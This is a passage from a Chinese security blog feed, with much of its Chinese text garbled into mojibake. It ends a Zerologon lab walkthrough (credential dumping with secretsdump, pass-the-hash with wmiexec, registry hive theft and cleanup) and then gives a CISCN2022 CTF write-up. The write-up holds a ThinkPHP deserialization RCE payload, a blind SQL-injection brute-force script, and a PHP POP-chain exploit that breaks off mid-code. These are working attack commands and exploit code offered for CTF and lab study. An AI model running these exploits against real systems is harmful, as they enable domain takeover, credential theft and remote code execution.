alt="image-20220713223643646"></p><p><strong>å¯¼å‡ºå¯†ç </strong></p><pre><code class="shell">python3 secretsdump.py sakura.com/ly-1\$@192.168.64.150    -no-pass &gt; ~/Desktop/pass.txt</code></pre><p>ps:kali $å‰è¦åŠ ä¸ªè½¬ä¹‰ç¬¦å·ï¼</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713230309872.png" alt="image-20220713230309872"></p><p><strong>è¿æ¥ä¸Šå»</strong></p><pre><code class="shell">python3 ./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:07d312335be3ab7eceda2a6d341e5cbb ly-1.sakura.com/administrator@192.168.64.150</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713230637115.png" alt="image-20220713230637115"></p><p>æˆåŠŸè¿æ¥</p><p><strong>æ¢å¤åŸŸæ§åŸå§‹hash</strong></p><pre><code class="shell">reg save HKLM\SYSTEM system.savereg save HKLM\SAM sam.savereg save HKLM\SECURITY security.savelget system.savelget sam.savelget security.save</code></pre><p><strong>åˆ é™¤æ–‡ä»¶</strong></p><pre><code class="shell">del /f system.savedel /f sam.savedel /f security.save</code></pre><p><strong>é€šè¿‡ sam.saveã€security.saveã€system.save è¿™äº›â½‚ä»¶è·å¾—åŸæ¥åŸŸæ§æœºå™¨ä¸Šçš„ Ntlm Hash å€¼ï¼Œâ½¤äºæ¢å¤å¯†ç </strong></p><pre><code class="shell">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713234613032.png" alt="image-20220713234613032"></p><p><strong>é€šè¿‡æ‹¿åˆ° $MACHINE.ACC: çš„å€¼ï¼Œç„¶åè¿›â¾æ¢å¤</strong></p><p>è„šæœ¬ä¸‹è½½ï¼š<a href="https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py">https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py</a></p><p>ä½¿ç”¨æ–¹æ³•:python reinstall_original_pw.py åŸŸæ§æœºå™¨å åŸŸæ§ip $MACHINE.ACCååŠéƒ¨åˆ†çš„å€¼</p><pre><code class="shell">python3 reinstall_original_pw.py ly-1 192.168.64.150 d6b706f6a4ea457327a4bfc1c4c642cb</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713235319943.png" alt="image-20220713235319943"></p><p><strong>æµ‹è¯•æ˜¯å¦æ¢å¤æˆåŠŸ</strong></p><pre><code class="shell">python3 secretsdump.py sakura.com/ly-1\$@192.168.64.150    -no-pass </code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713235714975.png" alt="image-20220713235714975"></p><p>æ­¤æ—¶ä½¿ç”¨ç©ºå¯†ç å»è·å–åŸŸå†…çš„æ‰€æœ‰ç”¨æˆ·çš„å‡­è¯å·²ç»ä¸è¡Œäº†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;å†…ç½‘å®‰å…¨ç¬¬ä¸€ç« &quot;&gt;&lt;a href=&quot;#å†…ç½‘å®‰å…¨ç¬¬ä¸€ç« &quot; class=&quot;headerlink&quot; title=&quot;å†…ç½‘å®‰å…¨ç¬¬ä¸€ç« &quot;&gt;&lt;/a&gt;å†…ç½‘å®‰å…¨ç¬¬ä¸€ç« &lt;/h1&gt;&lt;h2 id=&quot;å†…ç½‘åŸºç¡€çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#å†…ç½‘åŸºç¡€çŸ¥è¯†&quot; class=</summary>
      
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="å†…ç½‘" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="å†…ç½‘" scheme="https://sakurahack-y.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2022</title>
    <link href="https://sakurahack-y.github.io/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/"/>
    <id>https://sakurahack-y.github.io/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/</id>
    <published>2022-06-20T15:35:31.000Z</published>
    <updated>2022-07-06T07:08:16.343Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°:"></a>ç­¾åˆ°:</h2><p>æ ¹æ®å…¬ä¼—å·ç»™çš„æç¤ºï¼Œå¯æ„é€ å‡ºè„šæœ¬</p><pre><code>a=&#39;5543053560369047024142002765898038342775948119489181360354534575324142175929505171739721800870791249314864251567972295612874802183218042622056229755674962381242884261754543945970151712920835729189983000341612995263262927255805323073625456260457938936828798227686401899839962031005363203251056213941366146686875718432385301325733733171999005964405664494560905422663352160064965067318132130228461655121372448333527884088007285116323305598946651171485490621766011242810388503390388653399069240050404600114824579296172741241184113479&#39;a=a[0:28]tmp=&#39;0&#39;b=&#39;1732251413440356045166710055&#39;for i in range(28):    print((ord(a[i])+ord(b[i])-2*ord(tmp[0]))%10,end=&quot;&quot;)</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529121548778.png" alt="image-20220529121548778"></p><p>è®¿é—®url:</p><p>xxx/send?msg=s</p><p>å†è®¿é—®</p><p>xxx/send?msg=6275204973709393069208712710</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529121645372.png" alt="image-20220529121645372"></p><h2 id="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯1"><a href="#åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯1" class="headerlink" title="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯1"></a>åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯1</h2><h2 id="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯2"><a href="#åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯2" class="headerlink" title="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯2"></a>åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯2</h2><p>éé¢„æœŸè§£:</p><p>è¿æ¥ssh</p><p>è¿›å…¥</p><p>/root/cube-shell/instance/flag_server ç›®å½•</p><p>ä¸¤ä¸ªflagå…¨åœ¨é‡Œé¢</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529124444190.png" alt="image-20220529124444190"></p><h2 id="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3"><a href="#åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3" class="headerlink" title="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3"></a>åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3</h2><p>éé¢„æœŸ</p><p>è¿æ¥ssh</p><p>è¿›å…¥</p><p>/root/cube-shell/instance/flag_server ç›®å½•</p><p>su root</p><p>å¼±å£ä»¤å¯†ç :toor</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529142614152.png" alt="image-20220529142614152"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="é—®å·"><a href="#é—®å·" class="headerlink" title="é—®å·"></a>é—®å·</h2><p>ç›´æ¥å¡«é—®å·å³å¯å¾—åˆ°flag</p><h2 id="é”®ç›˜æµé‡"><a href="#é”®ç›˜æµé‡" class="headerlink" title="é”®ç›˜æµé‡"></a>é”®ç›˜æµé‡</h2><pre><code>tshark -T json -r ez_usb.pcapng &gt; data.json</code></pre><p>å¯¼å‡ºjsonæ•°æ®</p><p>ç»è¿‡åˆ†æï¼Œå®ƒæ˜¯æœ‰ä¸¤ä¸ªé”®ç›˜æµé‡ã€‚</p><p>åˆ†ç¦»ä¸€ä¸‹</p><pre><code>import jsonjsonData=&quot;&quot;with open(&quot;data.json&quot;) as f:    text=f.read()    jsonData=json.loads(text)data_1=&quot;&quot;data_2=&quot;&quot;for i in jsonData:    try:        if i[&quot;_source&quot;][&quot;layers&quot;][&quot;usb&quot;][&quot;usb.src&quot;]==&quot;2.8.1&quot;:            data_1+=i[&quot;_source&quot;][&quot;layers&quot;][&quot;usbhid.data&quot;]+&quot;\n&quot;        else:            data_2+=i[&quot;_source&quot;][&quot;layers&quot;][&quot;usbhid.data&quot;]+&quot;\n&quot;    except:        passprint(data_1)print(data_2)</code></pre><p>åˆ†åˆ«ä¿å­˜ä¸º1.txt,2.txt</p><p>ä½¿ç”¨ç½‘ä¸Šç°æˆå¾—è„šæœ¬è¿›è¡Œæå–æ•°æ®</p><pre><code class="python">normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#39;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;output = []keys = open(&#39;1.txt&#39;) //2.txtfor line in keys:    try:        if line[0]!=&#39;0&#39; or (line[1]!=&#39;0&#39; and line[1]!=&#39;2&#39;) or line[3]!=&#39;0&#39; or line[4]!=&#39;0&#39; or line[9]!=&#39;0&#39; or line[10]!=&#39;0&#39; or line[12]!=&#39;0&#39; or line[13]!=&#39;0&#39; or line[15]!=&#39;0&#39; or line[16]!=&#39;0&#39; or line[18]!=&#39;0&#39; or line[19]!=&#39;0&#39; or line[21]!=&#39;0&#39; or line[22]!=&#39;0&#39; or line[6:8]==&quot;00&quot;:             continue        if line[6:8] in normalKeys.keys():            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#39;2&#39;]        else:            output += [&#39;[unknown]&#39;]    except:        passkeys.close()flag=0print(&quot;&quot;.join(output))for i in range(len(output)):    try:        a=output.index(&#39;&lt;DEL&gt;&#39;)        del output[a]        del output[a-1]    except:        passfor i in range(len(output)):    try:        if output[i]==&quot;&lt;CAP&gt;&quot;:            flag+=1            output.pop(i)            if flag==2:                flag=0        if flag!=0:            output[i]=output[i].upper()    except:        passprint (&#39;output :&#39; + &quot;&quot;.join(output))</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529144605125.png" alt="image-20220529144605125"></p><p>å‘ç°æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œç¬¬äºŒä¸ªä¸ºå¯†ç </p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529145500226.png" alt="image-20220529145500226"></p><p>è§£å¼€å³å¯å¾—åˆ°flag</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529145515024.png" alt="image-20220529145515024"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>ä½¿ç”¨çš„</p><p><a href="https://www.freebuf.com/vuls/321546.html">https://www.freebuf.com/vuls/321546.html</a></p><p>exp:</p><pre><code class="php">&lt;?phpnamespace think&#123;    abstract class Model&#123;        private $lazySave = false;        private $data = [];        private $exists = false;        protected $table;        private $withAttr = [];        protected $json = [];        protected $jsonAssoc = false;        function __construct($obj = &#39;&#39;)&#123;            $this-&gt;lazySave = True;            $this-&gt;data = [&#39;whoami&#39; =&gt; [&#39;cat /flag.txt&#39;]];            $this-&gt;exists = True;            $this-&gt;table = $obj;            $this-&gt;withAttr = [&#39;whoami&#39; =&gt; [&#39;system&#39;]];            $this-&gt;json = [&#39;whoami&#39;,[&#39;whoami&#39;]];            $this-&gt;jsonAssoc = True;        &#125;    &#125;&#125;namespace think\model&#123;    use think\Model;    class Pivot extends Model&#123;    &#125;&#125;namespace&#123;    echo(urlencode((serialize(new think\model\Pivot(new think\model\Pivot())))));&#125;</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529173238834.png" alt="image-20220529173238834"></p><p>ls / æŸ¥çœ‹</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529173416181.png" alt="image-20220529173416181"></p><p>è¯»flag</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529111702941.png" alt="image-20220529111702941"></p><h2 id="ezpentest"><a href="#ezpentest" class="headerlink" title="ezpentest"></a>ezpentest</h2><p>wafè„šæœ¬å¦‚ä¸‹:</p><pre><code class="php">&lt;?phpfunction safe($a) &#123;    $r = preg_replace(&#39;/[\s,()#;*~\-]/&#39;,&#39;&#39;,$a);    $r = preg_replace(&#39;/^.*(?=union|binary|regexp|rlike).*$/i&#39;,&#39;&#39;,$r);    return (string)$r;  &#125;?&gt;</code></pre><p>åœ¨æ¯”èµ›ä¸­æ˜¯æ²¡æœ‰ç»™å‡ºä»£ç çš„</p><p>è€ƒå¯Ÿsqlæ³¨å…¥ï¼Œå’Œ2022è™ç¬¦babysqlå¾ˆç›¸ä¼¼ã€‚</p><p>å¯åˆ©ç”¨case whenæ³¨å…¥ï¼Œå¯æ„é€ å‡ºpayload</p><pre><code>0&#39;||case&#39;1&#39;when`password`collate&#39;utf8mb4_bin&#39;like&#39;&#123;&#125;%&#39;then+18446744073709551615+1+&#39;&#39;else&#39;0&#39;end||&#39;</code></pre><p>è¿‡æ»¤äº†å–åå¯¼è‡´ä¸èƒ½åˆ©ç”¨<del>0+1æ¥åˆ¶é€ æº¢å‡º,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ 18446744073709551615+1(å®ƒå°±ä»£è¡¨</del>0+1)æ¥åˆ¶é€ å‡ºæº¢å‡ºï¼Œå½“åŒ¹é…åˆ°æ­£ç¡®å­—ç¬¦æ—¶ï¼ŒæœåŠ¡å™¨ä¼šæŠ¥500ï¼Œå¦åˆ™å°±è¿”å›â€™0â€™ï¼ŒæœåŠ¡å™¨ä¼šæŠ¥errorã€‚æˆ–è€…ç”¨9223372036854775807+1ä¹Ÿè¡Œ</p><p>ç”±æ­¤å¯æ„é€ å‡ºè„šæœ¬:</p><pre><code class="python">import requestsimport stringurl = &#39;http://1.14.71.254:28470/login.php&#39;result = &#39;&#39;ceshi = &#39;&#39;lis = string.ascii_letters + string.digits + &quot;^!%@_$%*&quot;gl = &quot;%*()_&quot;while 1:    for i in lis:            if i in gl:  # è¿™é‡Œæ˜¯å¯¹likeæ­£åˆ™åŒ¹é…ä¸­çš„ä¸€äº›ç‰¹æ®Šç¬¦å·è¿›è¡Œè½¬ä¹‰                i = &quot;\\&quot; + i            ceshi = result + i            payload = &quot;0&#39;||case&#39;1&#39;when`username`collate&#39;utf8mb4_bin&#39;like&#39;&#123;0&#125;%&#39;then+18446744073709551615+1+&#39;&#39;else&#39;0&#39;end||&#39;&quot;.format(ceshi)            #print(payload)            #username æ”¹ä¸º passwordå³å¯å¾—åˆ°å¯†ç             data = &#123;                &quot;username&quot;: &quot;666&quot;,                &quot;password&quot;: payload            &#125;            response = requests.post(url, data=data)            if response.status_code == 500:                print(&quot;success!&quot;)                result = result + i                res2 = result                print(res2.replace(&quot;\\&quot;,&quot;&quot;))                break            elif response.status_code == 0:                continue            else:                continue</code></pre><p>å¯å¾—åˆ°è´¦å·å¯†ç :</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/7%25@@JT7XEDZVT%5DEG%7D%7BJWNSG.png" alt="img"></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010207219.png" alt="image-20220604010207219"></p><pre><code>nssctfwabbybaboo!@$%!!PAssw40d_Y0u3_Never_Konwn!@!!</code></pre><p>è¿›å»åå¾—åˆ°ä¸€ä¸²ä¹±ç æ–‡ä»¶</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010331417.png" alt="image-20220604010331417"></p><p>æŸ¥çœ‹æºä»£ç </p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010813177.png" alt="image-20220604010813177"></p><p>å‘ç°æ˜¯phpjiamiåŠ å¯†</p><p>githubæœ‰ç›¸åº”çš„å·¥å…·:<a href="https://github.com/wenshui2008/phpjiami_decode">https://github.com/wenshui2008/phpjiami_decode</a></p><p>ä½†æ˜¯å¦‚æœç›´æ¥å¤åˆ¶ç²˜è´´ä¸‹æ¥è§£å¯†å¤§éƒ¨åˆ†æƒ…å†µéƒ½ä¼šæ¼å­—ç¬¦ï¼Œè€Œphpjiamiè¿™é‡Œè§£å¯†ç›¸å¯¹æ¯”è¾ƒè‹›åˆ»ï¼Œå°‘ä¸€ä¸ªå­—ç¬¦éƒ½ä¼šè§£å¯†å¤±è´¥ï¼Œå¯ä»¥é‡‡ç”¨è„šæœ¬æŠŠæ··æ·†ä»£ç ä¿å­˜ä¸‹æ¥å†è§£å¯†ï¼ŒæŠŠurlå’Œcookieæ”¹æˆä½ çš„å°±å¯ä»¥äº†</p><pre><code class="php">&lt;?php$url =&quot;http://1.14.71.254:28470/login.php&quot;;$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, true);curl_setopt ($ch, CURLOPT_COOKIE, &quot;_ga=GA1.1.1492528755.1648872076; session=6fdc00cf-2ec3-4924-b99b-b474ac227c2d; PHPSESSID=cbdac7b296d255ad4c2c69066c4356ec&quot;);$result = curl_exec($ch);curl_close($ch);echo urlencode($result);file_put_contents(&quot;pop.php&quot;,$result);?&gt;</code></pre><p>å°†ç”Ÿæˆçš„æ–‡ä»¶æ”¾å…¥è§£å¯†è„šæœ¬</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604013234468.png" alt="image-20220604013234468"></p><p>æœ€ç»ˆå¾—åˆ°ä¸€ä¸‹ä»£ç </p><pre><code class="php">&lt;?phpsession_start();if(!isset($_SESSION[&#39;login&#39;]))&#123;    die();&#125;function Al($classname)&#123;    include $classname.&quot;.php&quot;;&#125;if(isset($_REQUEST[&#39;a&#39;]))&#123;    $c = $_REQUEST[&#39;a&#39;];    $o = unserialize($c);    if($o === false) &#123;        die(&quot;Error Format&quot;);    &#125;else&#123;        spl_autoload_register(&#39;Al&#39;);        $o = unserialize($c);        $raw = serialize($o);        if(preg_match(&quot;/Some/i&quot;,$raw))&#123;            throw new Error(&quot;Error&quot;);        &#125;        $o = unserialize($raw);        var_dump($o);    &#125;&#125;else &#123;    echo file_get_contents(&quot;SomeClass.php&quot;);&#125;</code></pre><p>è®¿é—®:</p><pre><code>view-source:http://1.14.71.254:28470/1Nd3x_Y0u_N3v3R_Kn0W.php</code></pre><p>å¯å¾—åˆ°someclassçš„ä»£ç </p><pre><code class="php">&lt;?phpclass A&#123;    public $a;    public $b;    public function see()    &#123;        $b = $this-&gt;b;        $checker = new ReflectionClass(get_class($b));        if(basename($checker-&gt;getFileName()) != &#39;SomeClass.php&#39;)&#123;            if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123;                ($b-&gt;a)($b-&gt;b.&quot;&quot;);            &#125;        &#125;    &#125;&#125;class B&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;see();        return &quot;1&quot;;    &#125;&#125;class C&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;read();        return &quot;lock lock read!&quot;;    &#125;&#125;class D&#123;    public $a;    public $b;    public function read()    &#123;        $this-&gt;b-&gt;learn();    &#125;&#125;class E&#123;    public $a;    public $b;    public function __invoke()    &#123;        $this-&gt;a = $this-&gt;b.&quot; Powered by PHP&quot;;    &#125;    public function __destruct()&#123;        //eval($this-&gt;a); ??? å“å¾—æˆ‘èµ¶ç´§æŠŠåé—¨æ³¨é‡Šäº†        //echo &quot;???&quot;;        die($this-&gt;a);    &#125;&#125;class F&#123;    public $a;    public $b;    public function __call($t1,$t2)    &#123;        $s1 = $this-&gt;b;        $s1();    &#125;&#125;?&gt;</code></pre><p>æ„é€ popé“¾ï¼Œè¿›è¡Œååºåˆ—åŒ–</p><p><strong>spl_autoload_registerçš„ä½œç”¨å°±æ˜¯æŠŠåé¢ååºåˆ—åŒ–ä¸å­˜åœ¨çš„ç±»æ‰€åœ¨çš„æ–‡ä»¶åŠ è½½è¿›æ¥</strong></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604015509088.png" alt="image-20220604015509088"></p><p>ç”±äºæ¼æ´ä»£ç åœ¨SomeClass.phpä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»åŒ…å«è¿™ä¸ªæ–‡ä»¶ã€‚</p><p>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªè¿‡æ»¤</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604170012434.png" alt="image-20220604170012434"></p><p>æˆ‘ä»¬éœ€è¦è®©å®ƒåŒ…å«åç›´æ¥è¿›å…¥destructé­”æœ¯å‡½æ•°</p><p>å…³äºgcå›æ”¶æœºåˆ¶å¯å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œå†™çš„éå¸¸å¥½:<a href="https://blog.csdn.net/qq_51295677/article/details/123520193">https://blog.csdn.net/qq_51295677/article/details/123520193</a></p><p>popé“¾æ¡çš„æ€è·¯éå¸¸æ¸…æ™°ï¼š</p><pre><code>Eçš„destruct --&gt; B çš„toString --&gt; A(rceç‚¹)</code></pre><p>æœ€ç»ˆexp:</p><pre><code class="php">&lt;?phpclass A&#123;    public $a;    public $b;    public function see()    &#123;        $b = $this-&gt;b;        $checker = new ReflectionClass(get_class($b));        if(basename($checker-&gt;getFileName()) != &#39;SomeClass.php&#39;)&#123;            if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123;                ($b-&gt;a)($b-&gt;b.&quot;&quot;);            &#125;        &#125;    &#125;&#125;class B&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;see();        return &quot;1&quot;;    &#125;&#125;class C&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;read();        return &quot;lock lock read!&quot;;    &#125;&#125;class D&#123;    public $a;    public $b;    public function read()    &#123;        $this-&gt;b-&gt;learn();    &#125;&#125;class E&#123;    public $a;    public $b;    public function __invoke()    &#123;        $this-&gt;a = $this-&gt;b.&quot; Powered by PHP&quot;;    &#125;    public function __destruct()&#123;        //eval($this-&gt;a); ??? å“å¾—æˆ‘èµ¶ç´§æŠŠåé—¨æ³¨é‡Šäº†        //echo &quot;???&quot;;        die($this-&gt;a);    &#125;&#125;class F&#123;    public $a;    public $b;    public function __call($t1,$t2)    &#123;        $s1 = $this-&gt;b;        $s1();    &#125;&#125;class SomeClass&#123;    public $a;&#125;$a = new A();$b = new B();$e = new E();$e -&gt;a = $b; #dieå‡½æ•°ä¼šæŠŠ$bå½“ä½œå­—ç¬¦ä¸²è¾“å‡ºï¼Œä»è€Œè°ƒç”¨äº†toStringé­”æœ¯æ–¹æ³•$b -&gt;a = $a;$arr = new ArrayObject(); #åªè¦æ˜¯phpçš„åŸç”Ÿç±»å³å¯$arr -&gt; a = &quot;system&quot;;$arr -&gt; b = &quot;ls /&quot;;$a -&gt;b = $arr;$c = new SomeClass();$c -&gt;a 